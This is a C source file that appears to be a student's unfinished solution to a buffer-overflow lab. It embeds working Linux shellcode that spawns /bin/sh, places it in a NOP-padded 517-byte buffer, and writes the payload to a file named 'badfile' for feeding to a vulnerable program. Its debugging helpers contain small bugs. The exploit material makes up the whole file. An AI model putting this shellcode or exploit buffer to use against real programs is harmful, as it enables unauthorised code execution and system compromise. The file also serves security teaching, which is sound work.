/* exploit.c  */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80";

  void printArray(char *array){
    for(int i = 0; i < sizeof(array); i++) {
      printf("%d ", array[i]);
      printf("\n");
    }
  }

  void StrCopy(char* str_1, char* str_2) {
    while(*str_1 != '\0') {
      *str_2 = *str_1++;
      ++str_2;
    }
  }


  void main(int argc, char **argv){
    char buffer[517];
    FILE *badfile;


    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    // printArray(&buffer);
    printf("%s", "shellcode ");
    printf("%s\n", shellcode);
    printf("%s", "buffer: \n");
    printf("%s\n", buffer);

    // printf("size of buffer = %u\n", sizeof(buffer));
    // StrCopy(shellcode, buffer);
    memcpy(buffer+100, shellcode, 21);
    printf("%s\n", "............................................");
    printf("%s", "updated buffer: \n");
    printf("%s\n", buffer);

    printf("%s", "test: \n");
    printf("%s\n", &buffer[0]);

    // printf("     shellcode is at address: %p\n", (void*)&shellcode);
    printf("buffer begins at address: %p\n", (void*)&buffer);
    // printf("%s\n", buffer[100]);
    printf("shellcode in buffer begins at address: %p\n", (void*)&buffer[100]);



    /* You need to fill the buffer with appropriate contents here */


    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
